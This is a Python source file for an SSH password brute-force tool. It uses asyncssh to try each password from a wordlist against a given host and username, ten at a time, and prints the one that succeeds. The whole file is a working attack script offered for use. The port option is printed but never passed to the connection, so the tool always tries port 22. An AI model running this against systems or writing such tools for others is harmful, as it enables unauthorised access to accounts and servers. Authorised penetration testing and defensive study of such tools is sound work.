import asyncio
import asyncssh
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit


def get_args():
    """ Function to get command-line arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=22,
                        type=int, required=False, help="Port to attack on, Default: 22")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                        required=True, type=str, help="Path to the password wordlist")
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username for bruteforce attack")
    arguments = parser.parse_args()
    return arguments


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    """Attempts SSH login with given credentials"""
    if found_flag.is_set():
        return  # Stop further attempts if the password is found                                                                                                                                                                           
                                                                                                                                                                                                                                           
    try:                                                                                                                                                                                                                                   
        async with asyncssh.connect(hostname, username=username, password=password) as conn:                                                                                                                                               
            found_flag.set()                                                                                                                                                                                                               
            print(colored(                                                                                                                                                                                                                 
                f"[SUCCESS] [{port}] [SSH] Host: {hostname} | Username: {username} | Password: {password}", 'green'))                                                                                                                      
            return  # Stop further attempts once the correct password is found                                                                                                                                                             
                                                                                                                                                                                                                                           
    except asyncssh.PermissionDenied:  # Corrected exception for authentication failures                                                                                                                                                   
        print(colored(                                                                                                                                                                                                                     
            f"[FAILED] Target: {hostname} | Username: {username} | Password: {password}", "red"))                                                                                                                                          
    except Exception as err:                                                                                                                                                                                                               
        print(f"[ERROR] {err}")                                                                                                                                                                                                            
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
async def main(hostname, port, username, wordlist):
    """Main function to manage SSH brute-force attempts"""
    tasks = []
    found_flag = asyncio.Event()  # Flag to stop when password is found
    concurrency_limit = 10  # Maximum concurrent tasks
    counter = 0

    try:
        with open(wordlist, 'r', encoding="latin-1") as f:
            passwords = [line.strip() for line in f.readlines()]

    except Exception as e:
        print(colored(f"[-] Error reading wordlist: {e}", "red"))
        return

    for password in passwords:
        if found_flag.is_set():  # Stop if a valid password is found
            break

        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        tasks.append(asyncio.create_task(ssh_bruteforce(
            hostname, username, password, port, found_flag)))

        await asyncio.sleep(0.5)
        counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n[-] Failed to find the correct password.", "red"))


if __name__ == "__main__":
    arguments = get_args()

    if not path.exists(arguments.wordlist):
        print(colored(
            "[-] Wordlist file not found. Please provide the correct path.", 'red'))
        exit(1)

    print("\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red"), arguments.target)
    print(colored(f"[*] Username\t: ", "light_red"), arguments.username)
    print(colored(f"[*] Port\t: ", "light_red"), arguments.port)
    print(colored(f"[*] Wordlist\t: ", "light_red"), arguments.wordlist)
    print(colored(f"[*] Protocol\t: ", "light_red"), "SSH")
    print("---------------------------------------------------------\n")

    print(colored(
        f"SSH Bruteforce started at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n")

    asyncio.run(main(arguments.target, arguments.port,
                     arguments.username, arguments.wordlist))
